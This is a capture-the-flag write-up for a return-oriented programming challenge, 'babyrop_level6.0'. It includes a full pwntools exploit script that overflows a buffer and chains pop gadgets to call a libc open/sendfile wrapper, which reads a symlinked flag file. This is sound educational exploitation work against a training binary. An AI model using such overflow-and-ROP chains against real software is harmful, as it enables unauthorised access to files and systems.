This level was quite tricky, instead of using syscalls this time we are importing the functions `open and sendfile` using libc, this means that the arguments, intead of being passed as `rdi, rsi, rdx, r10` are going to be passed into `rdi, rsi, rdx, rcx`. Note that this is the exact reason we are allowed to modify `rcx` using the gadget in the `free_gadgets` function.

Since you don't have the ability to make syscalls you need to use the function `force_import` which `open` a file and then calls `sendfile`, the problem here is to find a way to pass the string `/flag` to our binary... how do we do this ?

The answer is we dont ! The binary contains a sufficient amount of strings allowing us to make a symbolic link to our flag file to any strings you want in your binary, i personally used the string `yourself`.

Here's the code that allowed me to win the challenge.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyrop_level6.0
from pwn import *
import os, sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babyrop_level6.0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

#flag = open("/flag", "rb")
#fd_flag = flag.fileno()
#fd_3 = 3

#os.dup2(fd_flag, fd_3)

#print(f"File descriptor {fd_3} is open on file {os.readlink(f'/proc/self/fd/{fd_3}')}")

def start(argv=["/flag"], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
g1 = p64(0x4022b1) # pop rcx
g2 = p64(0x4022b9) # pop rdx
g3 = p64(0x4022c1) # pop rsi
g4 = p64(0x4022c9) # pop rdi

payload = [
    # overflow
    b"A" * 0x50,
    b"B" * 0x8,
    # rop
    g4,
    p64(0x403350),
    g3,
    p64(0),
    g2,
    p64(0),
    g1,
    p64(0x1000),
    p64(exe.sym.force_import),
    g4,
    p64(1),
    g3,
    p64(3),
    g2,
    p64(0),
    g1,
    p64(0x1000),
    p64(0x40229d)

]

io.send(b"".join(payload))

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```

We are basically calling the force_import function twice, the first time was to open the file we want, but the second time, instead of jumping at the beginning of it we directly jump to sendfile so we can avoid the open function and directly call sendfile with whatever argument we want.

Overall i really liked this challenge, hence me making a writeup on it.